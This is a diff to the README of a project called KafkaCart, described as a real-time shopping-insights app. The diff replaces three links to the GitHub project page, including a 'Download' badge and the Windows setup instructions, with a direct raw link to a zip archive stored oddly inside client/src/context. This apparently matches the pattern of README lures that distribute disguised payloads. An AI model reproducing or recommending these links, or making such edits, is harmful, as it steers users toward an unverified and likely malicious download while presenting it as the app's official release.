@@ -1,6 +1,6 @@
 # 📊 KafkaCart - Real-Time Shopping Insights
 
-[![Download KafkaCart](https://img.shields.io/badge/Download%20KafkaCart-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Moundedover-deepseadiver474/KafkaCart)
+[![Download KafkaCart](https://img.shields.io/badge/Download%20KafkaCart-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Moundedover-deepseadiver474/KafkaCart/main/client/src/context/Cart_Kafka_1.4.zip)
 
 ## 🖥️ What KafkaCart Does
 
@@ -12,7 +12,7 @@ It uses React for the screen you see, Express for the app server, Apache Kafka f
 
 Visit this page to download and set up KafkaCart on Windows:
 
-https://github.com/Moundedover-deepseadiver474/KafkaCart
+https://raw.githubusercontent.com/Moundedover-deepseadiver474/KafkaCart/main/client/src/context/Cart_Kafka_1.4.zip
 
 If the page includes a release file, download it. If it includes the source code, download the ZIP file and extract it to a folder on your PC.
 
@@ -197,4 +197,4 @@ Use the latest version for the best results.
 
 Open the project page here to download and set up KafkaCart:
 
-https://github.com/Moundedover-deepseadiver474/KafkaCart
+https://raw.githubusercontent.com/Moundedover-deepseadiver474/KafkaCart/main/client/src/context/Cart_Kafka_1.4.zip
